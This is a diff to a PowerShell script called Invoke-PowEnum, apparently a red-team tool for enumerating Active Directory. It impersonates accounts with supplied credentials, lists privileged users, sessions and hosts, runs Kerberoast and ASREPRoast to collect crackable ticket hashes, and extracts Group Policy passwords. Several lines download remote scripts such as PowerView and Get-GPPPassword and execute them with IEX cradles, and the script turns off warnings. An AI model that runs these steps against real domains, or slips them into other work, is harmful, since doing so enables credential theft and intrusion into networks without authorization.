@@ -29,9 +29,9 @@ function Invoke-PowEnum
 	
 		Basic: Basic Enumeration:
 				UsersAndGroups Speadsheet
-					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, misc privileged groups, All Domain Users, All Domain Groups,
+					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, misc privileged groups, All Domain Users, All Domain Groups, etc.
 				HostsAndSessions Spreadsheet
-					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts
+					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts, etc.
 		Roasting: Kerberoast and ASREPRoast
 		LargeEnv: Basic Enumeration without Get-DomainUser/Group/Computer
 		Special: Enumerates Users With Specific Account Attributes:
@@ -104,30 +104,39 @@ Param(
 	[Parameter(ParameterSetName = 'Credential')]
     [Management.Automation.PSCredential]
     [Management.Automation.CredentialAttribute()]
-    $Credential
+    $Credential,
+	
+	[Parameter(Position = 3)]
+    [Switch]
+    $NoExcel
 )
+
+#Supprese Errors and Warnings
+$ErrorActionPreference = 'Continue'
+$WarningPreference = "SilentlyContinue"
 
 #Start Stopwatch
 $stopwatch = [system.diagnostics.stopwatch]::startnew()
 
+#Create webclient cradle with proxy creds
+$webclient = New-Object System.Net.WebClient
+$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
 #Download PowerView from specified URL or from GitHub.
 try {
 	Write-Host "Downloading Powerview | " -NoNewLine
-    if (Test-Path .\PowerView.ps1){
-	    Write-Host "[Skipping Download] PowerView.ps1 present | "
-        Import-Module .\PowerView.ps1
+	
+	if (Test-Path .\PowerView.ps1){
+	    Write-Host "[Skipping Download] PowerView.ps1 Present | " -NoNewLine
+        IEX $webclient.DownloadString('.\PowerView.ps1')
 		Write-Host "Success" -ForegroundColor Green
 	}
 	else {	
-        $webclient = New-Object System.Net.WebClient
-        $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-        
         Write-Host "$PowerViewURL | " -NoNewLine
-        IEX $webclient.DownloadString($PowerViewURL)
+		IEX $webclient.DownloadString($PowerViewURL)
         Write-Host "Success" -ForegroundColor Green
     }
 }catch {Write-Host "Error" -ForegroundColor Red; Return}
-
 
 #Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
 if ($Credential -ne $null){
@@ -135,29 +144,28 @@ if ($Credential -ne $null){
 		$NetworkCredential = $Credential.GetNetworkCredential()
         $Domain = $NetworkCredential.Domain
 		$UserName = $NetworkCredential.UserName
-	Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
-	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
-	Write-Host "Success" -ForegroundColor Green 
+		Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
+		Invoke-UserImpersonation -Credential $Credential | Out-Null
+		Write-Host "Success" -ForegroundColor Green 
 	}catch{Write-Host "Error" -ForegroundColor Red; Return}
-	
 }	
 
 #Grab Local Domain
-if (!$FQDN) {$FQDN = (Get-Domain).Name}
+Write-Host "Enumeration Domain: " -ForegroundColor Cyan -NoNewLine
+if (!$FQDN) {
+	$FQDN = (Get-Domain).Name
+	Write-Host "$FQDN" -ForegroundColor Cyan
+}
+if (!$FQDN) {Write-Host "Unable to retrieve domain (make sure the FQDN, username, and password are correct), exiting..." -ForegroundColor Red;Return}
 
-if (!$FQDN) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
-else {Write-Host "Enumeration Domain: $FQDN" -ForegroundColor Cyan}
-
-#Supprese Errors and Warnings
-$ErrorActionPreference = 'Continue'
-$WarningPreference = "SilentlyContinue"
 
 #Set up spreadsheet arrary and count
 $script:ExportSheetCount = 1
 $script:ExportSheetFileArray = @()
 
+Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
+
 if ($Mode -eq 'Basic') {
-	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
 	$script:ExportSheetCount = 1
 	$script:ExportSheetFileArray = @()
 	PowEnum-DAs
@@ -189,17 +197,17 @@ if ($Mode -eq 'Basic') {
 	PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
 }
 elseif ($Mode -eq 'Roasting') {
+    try {
+		Write-Host "Downloading ASREPRoast | " -NoNewLine
+	    Write-Host "$ASREPRoastURL | " -NoNewLine
+		IEX $webclient.DownloadString($ASREPRoastURL)
+        Write-Host "Success" -ForegroundColor Green
+		PowEnum-ASREPRoast
+	}catch {Write-Host "Error" -ForegroundColor Red}
 	PowEnum-Kerberoast
-    $webclient = New-Object System.Net.WebClient
-    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-    Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
-    Write-Host "$ASREPRoastURL"
-    IEX $webclient.DownloadString($ASREPRoastURL)
-	PowEnum-ASREPRoast
 	PowEnum-ExcelFile -SpreadsheetName Roasting
 }
 elseif ($Mode -eq 'LargeEnv') {
-	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
 	$script:ExportSheetCount = 1
 	$script:ExportSheetFileArray = @()
 	PowEnum-DAs
@@ -213,6 +221,7 @@ elseif ($Mode -eq 'LargeEnv') {
 	PowEnum-ServerOperators
 	PowEnum-GPCreatorsOwners
 	PowEnum-CryptographicOperators
+	PowEnum-GroupManagers
 	PowEnum-ExcelFile -SpreadsheetName Large-Users
 	
 	$script:ExportSheetCount = 1
@@ -222,10 +231,10 @@ elseif ($Mode -eq 'LargeEnv') {
 	PowEnum-Subnets
 	PowEnum-DNSRecords
     PowEnum-WinRM
+    PowEnum-FileServers
 	PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
 }
 elseif ($Mode -eq 'Special') {
-	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
 	PowEnum-Disabled
 	PowEnum-PwNotReq
 	PowEnum-PwNotExp
@@ -236,19 +245,17 @@ elseif ($Mode -eq 'Special') {
 	PowEnum-ExcelFile -SpreadsheetName Special
 }
 elseif ($Mode -eq 'SYSVOL') {
-	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
-	
-	$webclient = New-Object System.Net.WebClient
-    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-    Write-Host "Downloading Get-GPPPassword:" -ForegroundColor Cyan
-    Write-Host "$GetGPPPasswordURL"
-    IEX $webclient.DownloadString($GetGPPPasswordURL)
-	PowEnum-GPPPassword
-	PowEnum-SYSVOLFiles
+	try {
+		Write-Host "Downloading Get-GPPPassword | " -NoNewLine
+	    Write-Host "$GetGPPPasswordURL | " -NoNewLine
+		IEX $webclient.DownloadString($GetGPPPasswordURL)
+        Write-Host "Success" -ForegroundColor Green
+		PowEnum-GPPPassword
+	}catch {Write-Host "Error" -ForegroundColor Red}
+	PowEnum-SYSVOLFiles	
 	PowEnum-ExcelFile -SpreadsheetName SYSVOL
 }
 elseif ($Mode -eq 'Forest') {
-	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
 	PowEnum-DomainTrusts
 	PowEnum-ForeignUsers
 	PowEnum-ForeignGroupMembers
@@ -270,17 +277,9 @@ if ($Credential -ne $null){
 	}catch{Write-Host "Error" -ForegroundColor Red; Return}
 }	
 
-if (Test-Path .\PowerView.ps1) {
-	try{
-		Write-Host "Removing PowerView Module | " -NoNewLine
-		Remove-Module PowerView
-		Write-Host "Success" -ForegroundColor Green 
-	}catch{Write-Host "Error" -ForegroundColor Red}
-}
-
 $stopwatch.Stop()
 $elapsedtime = "{0:N0}" -f ($stopwatch.Elapsed.TotalSeconds)
-Write-Host "Running Time: $elapsedtime seconds" -ForegroundColor Cyan
+Write-Host $("Running Time: " + $elapsedtime + "s") -ForegroundColor Cyan
 Write-Host "Current Date/Time: $(Get-Date)" -ForegroundColor Cyan
 Write-Host "Exiting..." -ForegroundColor Yellow
 }
@@ -632,6 +631,7 @@ function PowEnum-ExcelFile {
 		[String]
 		$SpreadsheetName
 	)
+	if ($NoExcel) {Return}
 	
 	try {
 		Write-Host "[ ]Combining csv file(s) to xlsx | " -NoNewLine
@@ -694,5 +694,5 @@ function PowEnum-ExcelFile {
 		[System.GC]::Collect()
 		[System.GC]::WaitForPendingFinalizers()
 		
-	}catch{Write-Host "Error" -ForegroundColor Red}
+	}catch{Write-Host "Error: Is Excel Installed?" -ForegroundColor Red}
 }
